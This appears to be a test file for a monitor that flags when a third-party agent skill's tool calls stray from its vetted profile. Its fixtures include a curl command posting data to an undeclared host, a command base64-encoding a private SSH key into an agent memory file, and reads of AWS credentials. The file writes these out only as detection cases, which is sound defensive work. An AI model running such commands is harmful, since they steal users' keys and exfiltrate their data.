import { test } from "node:test";
import assert from "node:assert/strict";
import { deviations, hostsIn, parseToolEvent, pathsIn } from "../src/runtime.js";
import type { ResolveResponse } from "../src/state.js";

const verdict = (over: Partial<ResolveResponse["trace_summary"] & object> = {}, network: string[] = []): ResolveResponse => ({
  status: "scored", skill: { name: "deploy-helper", registry: "clawhub", registry_label: "ClawHub", install_count: 1, page: "/skills/clawhub/deploy-helper/2.3.1", kind: "skill" },
  publisher: { handle: "x", verified: false, age_days: 10 }, version: { semver: "2.3.1", artifact_hash: "a".repeat(64), declared_permissions: { network, filesystem: ["./"], memory: false } },
  verdict: { id: "v", score: 90, label: "verified", duration_ms: 1, scenarios_run: 3 },
  trace_summary: { egress_hosts: [{ host: "api.vercel.com", declared: true }], files_read: ["./src/index.ts"], files_written: ["./dist/out.js"], memory_writes: [], tool_shadowing: [], ...over }, findings: [], last_safe_version: null,
});

test("hosts and paths are extracted from shell commands", () => {
  assert.deepEqual(hostsIn("curl -s https://telemetry-cdn.xyz/v1/collect -d @- && ssh deploy@build.example.com uptime"), ["telemetry-cdn.xyz", "build.example.com"]);
  const p = pathsIn("cat ~/.ssh/id_ed25519 | base64 >> ~/MEMORY.md");
  assert.ok(p.read.includes("~/.ssh/id_ed25519")); assert.ok(p.written.includes("~/MEMORY.md"));
});

test("unexpected egress, credential read and memory write are deviations; expected activity is not", () => {
  const r = verdict();
  const bash = parseToolEvent("Bash", { command: "curl https://telemetry-cdn.xyz/x; curl https://api.vercel.com/deploy" });
  const ds = deviations("deploy-helper", r, bash, "Bash", "s1");
  assert.deepEqual(ds.map((d) => d.kind), ["egress_unexpected"]);
  assert.match(ds[0].detail, /telemetry-cdn\.xyz/);
  const read = parseToolEvent("Read", { file_path: `${process.env.HOME}/.aws/credentials` });
  assert.deepEqual(deviations("deploy-helper", r, read, "Read", "s1").map((d) => d.kind), ["credential_read"]);
  const write = parseToolEvent("Write", { file_path: `${process.env.HOME}/work/acme/CLAUDE.md`, content: "x" });
  assert.deepEqual(deviations("deploy-helper", r, write, "Write", "s1").map((d) => d.kind), ["memory_write"]);
  const ok = parseToolEvent("Read", { file_path: `${process.cwd()}/src/index.ts` });
  assert.deepEqual(deviations("deploy-helper", r, ok, "Read", "s1"), []);
});

test("a memory write the sandbox also saw is not a deviation; declared hosts are fine", () => {
  const r = verdict({ memory_writes: [{ file: "MEMORY.md" }] }, ["hooks.example.com"]);
  assert.deepEqual(deviations("deploy-helper", r, parseToolEvent("Write", { file_path: `${process.env.HOME}/p/MEMORY.md` }), "Write", null), []);
  assert.deepEqual(deviations("deploy-helper", r, parseToolEvent("WebFetch", { url: "https://hooks.example.com/x" }), "WebFetch", null), []);
});

test("mcp tool names attribute to the server; Skill invocations set the active skill", () => {
  assert.equal(parseToolEvent("Skill", { skill: "deploy-helper" }).skillInvoked, "deploy-helper");
  assert.equal(parseToolEvent("mcp__github-mcp__create_pr", { title: "x" }).kind, "mcp");
});
